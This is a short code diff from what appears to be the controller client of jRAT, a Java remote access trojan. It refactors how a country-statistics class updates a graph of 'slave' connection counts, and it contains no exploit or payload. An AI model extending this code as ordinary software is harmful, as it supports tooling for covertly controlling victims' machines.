@@ -11,7 +11,7 @@ import java.util.List;
 
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Globals;
-import se.jrat.client.ui.frames.Frame;
+import se.jrat.client.Main;
 import se.jrat.client.utils.FlagUtils;
 import se.jrat.common.Logger;
 
@@ -102,7 +102,7 @@ public class CountryStatistics extends AbstractSettings implements Serializable 
 	}
 
 	public void reload() {
-		Frame.panelStats.countryGraph.clear();
+		Main.instance.getPanelStats().countryGraph.clear();
 
 		for (int i = 0; i < list.size(); i++) {
 			CountryStatEntry entry = list.get(i);
@@ -111,8 +111,8 @@ public class CountryStatistics extends AbstractSettings implements Serializable 
 				if (entry != null) {
 					GraphEntry total = new GraphEntry(entry.getCountry(), entry.getConnects(), FlagUtils.getFlag(entry.getCountry()));
 
-					Frame.panelStats.countryGraph.add(total);
-					Frame.panelStats.repaint();
+					Main.instance.getPanelStats().countryGraph.add(total);
+					Main.instance.getPanelStats().repaint();
 				}
 
 			} catch (Exception e) {
